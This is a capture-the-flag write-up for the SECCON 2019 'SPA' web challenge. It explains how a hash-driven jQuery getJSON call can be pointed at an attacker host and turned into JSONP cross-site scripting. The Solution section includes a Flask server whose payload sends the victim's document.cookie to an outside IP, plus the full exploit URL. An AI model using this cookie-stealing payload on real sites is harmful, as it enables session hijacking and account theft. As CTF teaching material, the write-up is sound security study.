# SPA [427pts]

## Description

```
Last day my colleague taught me the concept of the Single-Page Application, which seems to be the good point to kickstart my web application development. Well, now it turned out to be MARVELOUS!

http://spa.chal.seccon.jp:18364/

Steal the cookie.
```

## Content

In this page, we can see single web page that works as website that has multiple web pages.
The trick is that this web page enrolls event handler that changes all content of webpage to onhashchange event.
This can be interesting, but it is not related to vulnerability.

![Main Page](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/SPA.png)
Above: Content of [http://spa.chal.seccon.jp:18364/#](http://spa.chal.seccon.jp:18364/#)

Main page has 6 links for Flags, and one link for reporting admin.

![SECCON 2018](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/SPA_2018.png)
Above: Content of [http://spa.chal.seccon.jp:18364/#SECCON2018](http://spa.chal.seccon.jp:18364/#SECCON2018)

Each Flag page contains flags of the SECCON CTF in the corresponding year.

![SECCON 2019](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/SPA_2019.png)
Above: Content of [http://spa.chal.seccon.jp:18364/#SECCON2019](http://spa.chal.seccon.jp:18364/#SECCON2019)

Of course, we can not get the flag of this CTF :)

![Report](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/SPA_report.png)
Above: Content of [http://spa.chal.seccon.jp:18364/#report](http://spa.chal.seccon.jp:18364/#report)

At report page, there is a description that admin will read url we provide, and placeholder has `http://spa.chal.seccon.jp:18364/*****`
If we send url, website is redirected to `http://spa.chal.seccon.jp:18364/query`, with reponse of `Okay! I got it :-)`


If we read source code of this website, we can find out following part:
```
...

async fetchContest(contestId) {
	this.contest = await $.getJSON(`/${contestId}.json`)
},
async fetchContests() {
	this.contests = await $.getJSON('/contests.json')
},
async onHashChange() {
	const contestId = location.hash.slice(1);
	if (contestId) {
		if (contestId === 'report') {
			this.goReport();
		} else {
			await this.goContest(contestId);
		}
	} else {
		this.goHome();
	}
},

...
```
It seems this website load flag information from json file using jQuery getJSON function.
For example, [http://spa.chal.seccon.jp:18364/SECCON2019.json](http://spa.chal.seccon.jp:18364/SECCON2019.json) will give us
```
{
  "flags": [
    {
      "genre": "Web",
      "name": "SPA",
      "point": null,
      "flag": null
    }
  ],
  "name": "SECCON CTF 2019 Quals",
  "links": {
    "CTFtime": "https://ctftime.org/event/799"
  },
  "date": {
    "start": 1571464800000,
    "end": 1571551200000
  }
}
```
and [http://spa.chal.seccon.jp:18364/contests.json](http://spa.chal.seccon.jp:18364/contests.json) will give us
```
[
  {
    "name": "SECCON 2014",
    "count": 29,
    "id": "SECCON2014"
  },
  {
    "name": "SECCON 2015",
    "count": 29,
    "id": "SECCON2015"
  },
  {
    "name": "SECCON 2016",
    "count": 27,
    "id": "SECCON2016"
  },
  {
    "name": "SECCON 2017",
    "count": 28,
    "id": "SECCON2017"
  },
  {
    "name": "SECCON 2018",
    "count": 25,
    "id": "SECCON2018"
  },
  {
    "name": "SECCON 2019",
    "count": 1,
    "id": "SECCON2019"
  }
]
```

## Solution

### host bypass

If url starts with one leading slash, following string will be interpreted as path, and scheme and host will be one of current webpage.
But, if url starts with two leading slash, following string will be interpreted as host + path, and only scheme will be one of current webpage.
In this way, If we place additional slash on the beginning of hash, we can inject malicious json to the webpage.
For example,`http://spa.chal.seccon.jp:18364/#/evil.com/payload`

### JSONP for XSS

At [jQuery API Documentation](https://api.jquery.com/jQuery.getJSON/), we can find out following:
```
JSONP

If the URL includes the string "callback=?" (or similar, as defined by the server-side API), the request is treated as JSONP instead. See the discussion of the jsonp data type in $.ajax() for more details.
```
With this, we can make admin make JSONP request to our server, so that we inject XSS script to admin web page.

I wrote a simple JSONP response server for XSS using flask.
```
#!/usr/bin/env python3
from flask import Flask, request, Response

app = Flask(__name__)
app.secret_key = "sumango3"

@app.route('/')
def main():
	data = 'location.href="http://1.2.3.4:1234?ck="+document.cookie;'
	mimetype = 'application/javascript'
	resp = Response(data, mimetype=mimetype)
	resp.headers['Access-Control-Allow-Origin'] = '*'
	return resp

if __name__ == '__main__':
	app.run(host='0.0.0.0',port=5001,debug=True)
```
and, our payload will be `http://spa.chal.seccon.jp:18364/#/1.2.3.4:1234/?callback=?&`

![My server](https://github.com/sumango3/ctf/blob/master/Images/2019-SECCON-CTF/SPA_server.png)
Above: successful XSS

## Flag

	SECCON{Did_you_find_your_favorite_flag?_Me?_OK_take_me_now_:)}
